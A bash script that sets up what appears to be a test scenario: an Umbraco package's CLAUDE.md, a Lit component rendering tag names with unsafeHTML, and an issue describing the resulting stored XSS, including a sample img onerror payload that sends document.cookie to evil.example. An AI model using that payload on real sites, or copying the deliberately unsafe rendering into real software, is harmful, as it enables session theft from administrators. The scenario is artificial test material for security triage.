#!/usr/bin/env bash
set -euo pipefail
cat > CLAUDE.md <<'EOF'
# Umbraco.Community.TagCloud

An Umbraco package (C# plus a Lit backoffice client).

## Version lines

| Line | Integration branch | Release branch | Phase |
|---|---|---|---|
| Umbraco 17 | `v17/dev` | `v17/main` | Active: features and fixes |
| Umbraco 13 | `v13/dev` | `v13/main` | Security fixes only, until 2026-12-14 |

## Issue tracker

- Type: GitHub Issues
- Location: this repo, `jodean/Umbraco.Community.TagCloud`
- Access: `gh`
- State labels: the defaults
EOF
mkdir -p src/Umbraco.Community.TagCloud/Client/src
cat > src/Umbraco.Community.TagCloud/Client/src/tag-report.element.ts <<'EOF'
import { LitElement, html, customElement, property } from '@umbraco-cms/backoffice/external/lit';
import { unsafeHTML } from '@umbraco-cms/backoffice/external/lit';

@customElement('tag-report')
export class TagReportElement extends LitElement {
  @property({ type: Array }) tags: Array<{ text: string; count: number }> = [];

  render() {
    return html`<ul>${this.tags.map((t) => html`<li>${unsafeHTML(t.text)} (${t.count})</li>`)}</ul>`;
  }
}
EOF
cat > ISSUE-31.md <<'EOF'
# #31 Tag names with angle brackets break the Tag Reports dashboard

Opened by: site-dev-4 · Labels: state/ready

A tag named `<b>news</b>` shows in bold on the Tag Reports dashboard. Worse, a tag named
`<img src=x onerror="fetch('https://evil.example/c?'+document.cookie)">` runs when any backoffice
user opens the dashboard. Any editor who can add tags can do this.

---

## Triage report (issue-triage, this morning)

- type: bug
- security: true
- state: none applied (security reports get no label)
- summary: tag text is rendered with unsafeHTML in tag-report.element.ts
EOF
